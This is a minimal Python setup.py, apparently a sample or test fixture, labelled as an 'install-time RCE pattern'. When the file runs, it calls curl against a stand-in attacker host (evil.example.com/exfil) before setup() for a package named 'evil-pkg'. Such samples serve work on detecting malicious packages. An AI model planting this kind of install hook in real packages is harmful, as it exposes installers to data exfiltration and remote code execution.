from setuptools import setup
import subprocess
# install-time RCE pattern
subprocess.Popen(["curl", "http://evil.example.com/exfil"])
setup(name="evil-pkg", version="1.0.0")
